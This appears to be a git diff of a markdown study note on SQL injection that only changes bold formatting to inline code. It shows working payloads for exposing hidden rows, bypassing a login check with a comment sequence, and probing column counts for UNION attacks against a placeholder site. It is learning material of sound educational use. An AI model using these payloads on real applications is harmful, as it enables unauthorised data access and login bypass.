@@ -12,25 +12,25 @@ There are a wide variety of SQLi :
 ## Retrieving hidden data
 
 The SQL query for : https//website.com:products?category=Gifts 
-is : **SELECT * FROM products WHERE category = 'Gifts' AND released = 1**
+is : `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
 
 For an insecure website, an attacker can construct an attack to include inreleased products :
 
-https//website.com:products?category=Gifts'--
-**SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1**
+https//website.com:products?category=Gifts`'--`
+`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
 
 The double dash sequence is a commment indicator that mean the rest of the query is interpreted as a comment.
 
 An attacker can cause the application to display all the products in any category, including categories that they don't know about with a boolean :
 
-https//website.com:products?category=Gifts'+OR+1=1--
+https//website.com:products?category=Gifts`'+OR+1=1--`
 This query return all item from the Gifts category, or 1 is equal to 1, since is alsways true, the query return all items.
 
 ## Subverting application logic
 
-An attacker can log in as any user without a password simply by using the comment sequence -- to remove the password check from the WHERE clause. For example :
+An attacker can log in as any user without a password simply by using the comment sequence `--` to remove the password check from the WHERE clause. For example :
 
-**SELECT * FROM users WHERE username = 'administrator'--' AND password = ''**
+`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
 
 ## Retrieving data from other databases tables
 
@@ -38,7 +38,7 @@ This is done using the SQLi UNION attack.
 
 The UNION keyword can be used to retrieve data from other databases, it permit to execute one or more additional SELECT queries and append the results to the original query.
 
-Example : **SELECT a, b FROM table1 UNION SELECT c, d FROM table2**
+Example : `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
 
 This query return q result set with 2 columns, containing values from a, b in _table1_, and c, d in _table2_.
 
@@ -51,14 +51,14 @@ so we need to find how many columns are being returned from the original query +
 ### Determining the number of columns required in an SQLi UNION attack
 
 1 : injecting a serie of ORDER BY clauses and incrementing the specified column index :
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--
+`' ORDER BY 1--`
+`' ORDER BY 2--`
+`' ORDER BY 3--`
 etc...
 
 2 : submitting a series of UNION SELECT payloads :
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-etc...
+`' UNION SELECT NULL--`
+`' UNION SELECT NULL,NULL--`
+`etc...`
 
 for this second, if the number of nulls does not match the number of columns, the database can return an error.
